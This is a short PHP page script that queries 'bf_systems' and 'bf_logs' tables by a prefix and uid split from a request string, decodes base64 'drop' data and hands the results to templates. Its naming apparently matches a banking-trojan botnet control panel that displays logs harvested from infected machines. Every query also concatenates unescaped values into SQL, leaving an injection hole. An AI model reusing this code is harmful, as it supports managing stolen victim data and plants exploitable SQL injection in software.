<?php

function getdi(&$info){
	$info = json_decode(base64_decode($info));
	$info->drop->other = get_object_vars($info->drop->other);
}

function system_get($row){
	global $systems;

	$systems[$row->nid] = $row->name;
}

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['str'])){
	$matches = explode('0', $Cur['str'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}
	
	if($_SESSION['user']->config['infoacc'] == '1'){
		$sql_logs = '';
		$sql_sys = '';
		
		foreach($_SESSION['user']->config['systems'] as $key => $item){
		    $sql_logs .= ' OR (system = \''.$key.'\')';
		    $sql_sys .= ' OR (nid = \''.$key.'\')';
		}
		$sql_logs = preg_replace('~^ OR ~', '', $sql_logs);
		$sql_sys = preg_replace('~^ OR ~', '', $sql_sys);
		
		if(!empty($sql_sys)) $mysqli->query('SELECT * from bf_systems WHERE ' . $sql_sys, null, 'system_get');
		
		
		if(!empty($_SESSION['user']->config['userid'])){
			if(!empty($sql_logs)) $logs = $mysqli->query('SELECT * FROM bf_logs WHERE (userid = \''.$_SESSION['user']->config['userid'].'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND ('.$sql_logs.')', null, null, false);
		}else{
			if(!empty($sql_logs)) $logs = $mysqli->query('SELECT * FROM bf_logs WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND ('.$sql_logs.')', null, null, false);
		}
	}else{
		$mysqli->query('SELECT * from bf_systems', null, 'system_get');
		if(!empty($_SESSION['user']->config['userid'])){
			$logs = $mysqli->query('SELECT * FROM bf_logs WHERE (userid = \''.$_SESSION['user']->config['userid'].'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\')', null, null, false);
		}else{
			$logs = $mysqli->query('SELECT * FROM bf_logs WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\')', null, null, false);
		}
	}
	
	$smarty->assign('systems', $systems);
	$smarty->assign('logs', $logs);
}

?>